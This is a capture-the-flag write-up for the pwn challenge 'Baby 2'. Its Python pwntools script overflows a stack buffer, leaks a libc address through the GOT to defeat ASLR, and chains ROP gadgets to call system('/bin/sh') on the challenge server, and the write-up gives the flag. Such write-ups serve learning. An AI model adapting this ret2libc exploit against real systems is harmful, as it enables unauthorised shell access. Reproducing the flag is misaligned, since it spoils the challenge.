# Baby 2

Categories: pwn baby pwned! <br/>
Description: When Swordfish came out, these were considered some state of the art techniques. Let's see if you have what it takes. <br/>
File: [baby2](baby2), [libc.so.6](libc.so.6)

## Solution

This time the binary does not contains a `win` function. Assuming ASLR is enabled on the remote target, I first leaked a
known address and calculated the offset.

```python
from pwn import *

isRemote = args['REMOTE']

binary = './baby2'
localElf = '/usr/lib/libc.so.6'
remoteElf = './libc.so.6'

context.binary = binary

elf = ELF(binary)
libc = ELF(remoteElf if isRemote else localElf)

p = remote('baby-01.pwn.beer', 10002) if isRemote else elf.process()
p.recvuntil('input: ')

r = ROP(elf)
r.puts(elf.got['gets'])
r.main()

p.sendline('A' * 24 + str(r))

leak = p.recvuntil('input: ')
leaked_gets = u64(leak[:6].ljust(8, '\x00'))
libc.address = leaked_gets - libc.sym['gets']
```

Now I could simply call `system` with the correct parameter:

```python
r = ROP(libc)
r.raw(r.find_gadget(['ret']).address) # align the stack
r.system(next(libc.search('/bin/sh')))
p.sendline('A' * 24 + str(r))

p.interactive()
```

The flag was `sctf{An0tH3r_S1lLy_L1Ttl3_R0P}`.
